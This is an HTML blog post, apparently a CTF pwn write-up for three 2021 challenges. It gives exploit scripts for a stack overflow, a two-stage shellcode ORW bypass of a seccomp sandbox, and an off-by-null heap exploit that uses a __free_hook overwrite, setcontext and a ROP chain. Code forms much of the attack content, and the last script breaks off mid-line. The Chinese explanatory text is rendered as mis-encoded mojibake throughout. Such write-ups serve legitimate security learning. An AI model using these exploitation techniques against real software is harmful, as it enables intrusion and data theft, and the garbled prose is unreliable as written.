    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡æ¯”èµ›ï¼Œæˆ‘èƒ½åšçš„åº”è¯¥æ˜¯æœ‰ä¸‰é¢˜çš„ï¼Œå¯èƒ½è¿˜æ˜¯å¤ªèœäº†ï¼Œæ¯”èµ›æ—¶å°±æ˜¯æ²¡å‡ºï¼Œæœ€ç»ˆåªåšäº†ä¸ªç­¾åˆ°é¢˜ï¼Œè¿˜å¥½æ‰‹å¿«æŠ¢äº†ä¸€è¡€ï¼Œé•¿è·¯æ¼«æ¼«ï¼Œç»§ç»­åŠ æ²¹å§ï¼</p><p>å¤ç°æ¥æºï¼š<a href="https://blog.csdn.net/eeeeeight/article/details/120255533">https://blog.csdn.net/eeeeeight/article/details/120255533</a></p><h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>è¿™é¢˜ç­¾åˆ°é¢˜ï¼Œå¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;192.168.39.50&#x27;</span>,<span class="hljs-number">11000</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;Input:\n&quot;)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x2c</span> + p32(<span class="hljs-number">0x80490a0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x0804c029</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913165518141.png" alt="image-20210913165518141"></p><p>å¸¸è§„checksecï¼Œ64ä½ï¼Œä¿æŠ¤åŸºæœ¬æ²¡å¼€ï¼Œå­˜åœ¨å¯æ‰§è¡Œæ®µï¼Œè¿™ç§ä¸€èˆ¬å°±æ˜¯æ³¨å…¥shellcodeå»æ‰§è¡Œçš„</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170209042.png" alt="image-20210913170209042"></p><p>åŒæ—¶ï¼Œå½“ä½ æ‰§è¡Œåˆ°adminåŠŸèƒ½æ—¶ï¼Œä¼šå¼€å¯æ²™ç®±ï¼Œç¦ç”¨äº†execveï¼Œæ‰€ä»¥è¿™é¢˜å°±å˜æˆäº†orwäº†ã€‚adminåŠŸèƒ½æ˜¯å¿…é¡»è¦è¿›çš„ï¼Œå› ä¸ºè¿™é‡Œæ‰å­˜åœ¨ç€æ¼æ´â€”â€”æ ˆæº¢å‡º</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170334228.png" alt="image-20210913170334228"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170528035.png" alt="image-20210913170528035"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170611997.png" alt="image-20210913170611997"></p><p>bufè¿™é‡Œå¯ä»¥å†™å…¥30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œä½†æ˜¯å…·ä½“çš„é•¿åº¦è¦åŠ¨æ€å»çœ‹ã€‚æˆ‘è¿™è¾¹æ˜¯è¿›å…¥åˆ°äº†adminåŠŸèƒ½ä¸­ï¼Œå¯ä»¥çœ‹è§ï¼Œå‰äº”ä¸ªå­—èŠ‚æ˜¯ç”¨æ¥å¯¹é½æ ˆå†…å®¹ï¼Œæ¥ä¸‹æ¥çš„å…«ä¸ªå­—èŠ‚å°±å¯ä»¥è¦†ç›–rbpå†…å®¹ï¼Œè¿™è¾¹è¦†ç›–çš„æ˜¯adminä¸­è¾“å…¥å‡½æ•°çš„rbp</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913171057369.png" alt="image-20210913171057369"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221356910.png" alt="image-20210913221356910"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221754144.png" alt="image-20210913221754144"></p><p>å¹¶ä¸”å‘¢ï¼Œ.bssæ˜¯å±äºå¯æ‰§è¡Œæ®µçš„ï¼Œå…ˆè¦†ç›–è¿”å›åœ°å€å»æ‰§è¡Œreadå‡½æ•°ï¼Œå› ä¸ºreadæ˜¯æœ‰ä¸‰ä¸ªå‚æ•°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿå½“æ‰§è¡Œreadå‡½æ•°æ—¶ï¼Œä¸‰ä¸ªå‚æ•°éƒ½æ˜¯å·²ç»æ»¡è¶³äº†çš„ï¼ˆå› ä¸ºæˆ‘ä»¬åˆšå¼€å§‹å°±å€Ÿç€readå‡½æ•°çš„æº¢å‡ºï¼Œå¹¶ä¸”å¯„å­˜å™¨å¹¶æœªè¢«æ”¹å˜ï¼‰ã€‚æ‰€ä»¥å†™å…¥æ•°æ®çš„åœ°æ–¹æ˜¯æ ˆä¸Šä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥å…ˆæ„é€ ä¸€æ¬¡shellcodeï¼ˆæ³¨æ„shellcodeå¤§å°ï¼Œå› ä¸ºé•¿åº¦æœ€å¤šä¸º0x1dï¼‰ç³»ç»Ÿè°ƒç”¨readå‡½æ•°ï¼Œå¾€.bssä¸Šå†™ç¬¬äºŒä¸ªshellcodeï¼Œè¿™æ¬¡shellcodeçš„é•¿åº¦ä¸€å®šè¦å¤Ÿå¤§ï¼Œä¸ç„¶å†™ä¸ä¸‹ã€‚æœ€åå°±æ˜¯åœ¨.bssä¸Šå†™æœ€ç»ˆçš„orwï¼Œè¯»å–flagå³å¯</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913211252996.png" alt="image-20210913211252996"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>context.binary = elf<br>p = process(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>call_rsi = <span class="hljs-number">0x000000000040186b</span><br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000401007&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;password: &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x602030</span>+<span class="hljs-number">0x28</span>)+ p64(read) + p64(call_rsi)<br>p.sendline(payload)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              xor rax, rax;</span><br><span class="hljs-string">              push r11;</span><br><span class="hljs-string">              pop rdx;</span><br><span class="hljs-string">              mov rsi, 0x602100;</span><br><span class="hljs-string">              syscall;</span><br><span class="hljs-string">              add rsi, 28;</span><br><span class="hljs-string">              jmp rsi;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.sendline(shellcode)<br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rax, 2;</span><br><span class="hljs-string">               sub rsi, 16;</span><br><span class="hljs-string">               mov rdi, rsi;</span><br><span class="hljs-string">               xor rsi, rsi;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string"></span><br><span class="hljs-string">               mov rdi, rax;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rsi, 0x602300;</span><br><span class="hljs-string">               mov rdx, 0x80;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               </span><br><span class="hljs-string">               mov rax, 1;</span><br><span class="hljs-string">               mov rdi, 1;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode1))<br>p.sendline(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">11</span> + <span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>*<span class="hljs-number">3</span> + shellcode1)<br>p.interactive() <br></code></pre></td></tr></table></figure><h2 id="Whats-your-name"><a href="#Whats-your-name" class="headerlink" title="Whats your name"></a>Whats your name</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204918588.png" alt="image-20210923204918588"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083229104.png" alt="image-20210924083229104"></p><p>addé‡Œé¢ï¼Œä¼šå…ˆç”³è¯·ä¸€å—0x10å¤§å°çš„å †å—ï¼Œç„¶ååœ¨å‰å…«å­—èŠ‚ä½œä¸ºå‡½æ•°æŒ‡é’ˆå­˜æ”¾putsåœ°å€ï¼Œåå…«å­—èŠ‚å­˜æ”¾ä¸€ä¸ªå¤§å°åœ¨0~0x100ä¹‹é—´çš„å †å—åœ°å€ï¼Œæœ€å¤šèƒ½ç”³è¯·å‡º10ä¸ªå †å—<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083439735.png" alt="image-20210924083439735"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083201516.png" alt="image-20210924083201516"></p><p>åœ¨edité‡Œé¢ï¼Œå†™å…¥å‡½æ•°ä¼šå †æº¢å‡ºä¸€ä¸ª0ï¼Œæ¼æ´ç‚¹offbynull</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083514708.png" alt="image-20210924083514708"></p><p>showé‡Œé¢ï¼Œè°ƒç”¨ä¹‹å‰å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆï¼Œæ‰“å°å †å—å†…å®¹</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083618714.png" alt="image-20210924083618714"></p><p>é‡Šæ”¾å †å—ï¼Œå…¨éƒ¨ç½®0</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083715443.png" alt="image-20210924083715443"></p><p>æœ€åï¼Œç¨‹åºå¼€äº†æ²™ç®±ï¼Œçœ‹æ¥æ˜¯è¦orwäº†</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204552633.png" alt="image-20210923204552633"></p><p>è¿™æ˜¯ä»€ä¹ˆéƒ½æ²¡åšçš„æƒ…å†µï¼Œç”±äºå¼€å¯æ²™ç®±éƒ½æ˜¯ä¼šè¿™æ ·çš„å‡ºç°å¾ˆå¤šçš„å †å—ï¼Œé‡Œé¢æœ‰ä¸€å—æ˜¯unsorted chunkï¼Œç»™ä»–ç”³è¯·å›æ¥ï¼Œé‡Œé¢å°±å·²ç»å­˜æ”¾ç€è„æ•°æ®äº†ï¼Œç›´æ¥å°±èƒ½æ³„éœ²libcã€‚åŒæ ·ä¹Ÿèƒ½æ³„éœ²å‡ºå †ä¸Šåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924092730279.png" alt="image-20210924092730279"></p><p>æˆ‘ä»¬è¦åˆ©ç”¨offbynullï¼Œè‚¯å®šæ˜¯è¦åˆ¶é€ å‡ºå †å—é‡å çš„ï¼Œé‚£ä¹ˆå°±ä¸€å®šè¦è®©å †å—æ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥ä¸èƒ½æ˜¯ä¸Šé¢biné“¾å­˜åœ¨çš„å¤§å°ï¼Œå¹¶ä¸”offbynullï¼Œé‚£æº¢å‡ºè¢«è¦†ç›–ä¸º0çš„è‚¯å®šæ˜¯0xf0çš„å †å—<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093026970.png" alt="image-20210924093026970"></p><p>è¿™æ˜¯è¿ç»­ç”³è¯·å‡ºæ¥çš„å››ä¸ªå †å—ï¼Œå…¨éƒ½è¿åœ¨äº†ä¸€èµ·ï¼Œæ‰æ–¹ä¾¿æˆ‘ä»¬åç»­åˆ¶é€ å †å—é‡å </p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093202818.png" alt="image-20210924093202818"></p><p>é€šè¿‡offbynullï¼ŒæˆåŠŸå°†in_useä½ç½®ä¸º0</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924094657672.png" alt="image-20210924094657672"></p><p>ç„¶åé‡Šæ”¾å †å—ï¼Œè§¦å‘åˆå¹¶</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924195657525.png" alt="image-20210924195657525"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200058670.png" alt="image-20210924200058670"></p><p>ç„¶åå†æŠŠ0xf0å †å—ç”³è¯·å›æ¥ï¼Œæ¥ç€æˆ‘ä»¬ç”³è¯·åœ¨binæœ‰çš„å †å—ï¼Œå› ä¸ºå†åˆ†é…å°±æ˜¯è¦é‡å åœ¨ä¹‹å‰æœªè¢«é‡Šæ”¾çš„0x40çš„å †å—ä¸Šäº†ï¼Œè€Œæˆ‘ä»¬è¦å’Œè¿™ä¸ªå †å—é‡å çš„è¦é€‰æ‹©é‚£ä¸ªç¨‹åºå¸®æˆ‘ä»¬ç”³è¯·çš„å †å—ï¼Œå› ä¸ºæ§åˆ¶è¿™ä¸ªå †å—æ˜¯å¯ä»¥å€Ÿç€editåŠŸèƒ½æ‰§è¡Œä»»æ„åœ°å€å†™çš„ï¼Œæˆ–è€…åœ¨showåŠŸèƒ½é‡Œé¢è·å¾—æ‰§è¡Œæƒé™ï¼Œå¯è°“å¥½å¤„å¤šå¤š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure><p>åˆ°ç°åœ¨ï¼Œæ‰€æœ‰çš„é“ºå«éƒ½å·²ç»å‡†å¤‡å¥½äº†ï¼Œæ¥ç€å…ˆè®¡ç®—ä¸€ä¸‹æˆ‘ä»¬éœ€è¦çš„gadgetï¼Œä»¥åŠropçš„åœ°å€è®¡ç®—ï¼Œä»¥åŠflagåœ°å€çš„æ’å¸ƒ</p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200749914.png" alt="image-20210924200749914"></p><p>æŠŠflagå­—ç¬¦ä¸²å†™åˆ°å‰é¢æˆ‘ä»¬ç”³è¯·çš„1å †å—ä¸Šï¼Œå¯ä»¥ç›´æ¥ç”¨æœç´¢åŠŸèƒ½ï¼Œæ›´å¿«ç‚¹ï¼Œropçš„åœ°å€è¦åé¢ç”³è¯·å‡ºå†™çš„å †å—å†å›æ¥ç®—çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924202223468.png" alt="image-20210924202223468"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924211125389.png" alt="image-20210924211125389"></p><p>å€Ÿç€å‰é¢çš„å †å—é‡å ï¼Œå¾€free_hooké‡Œé¢å†™setcontext+53å°±è¡Œï¼Œç„¶åå°±æ˜¯æœ€åçš„å †ä¸Šå¸ƒç½®ropé“¾ï¼Œå †å—ç»™çš„å¤Ÿå¤§ï¼Œé‚£å°±ç›´æ¥é€‰æ‹©æœ€å¤§çš„å †å—è¿›è¡Œå¸ƒç½®ï¼Œå› ä¸ºè¦å…ˆç”³è¯·ä¸€ä¸ª0x20çš„å †å—ï¼Œå‰©ä¸‹çš„å¤§å°ä¸å¤Ÿ0x100ï¼Œæ‰€ä»¥å †å—çš„ä½ç½®æ˜¯åœ¨æœ€ä¸‹æ–¹çš„ï¼Œç„¶ååœ¨ä¸Šé¢å¸ƒç½®å¥½ropï¼Œæœ€åå°±æ˜¯åœ¨setcontextçš„gadgetæŒ‡å‘çš„ç›¸åº”ä½ç½®å†™å¥½ï¼Œè·³è½¬æ‰§è¡Œå°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924220626687.png" alt="image-20210924220626687"></p><p>æˆåŠŸè¯»å–flagï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./name&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;name size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span 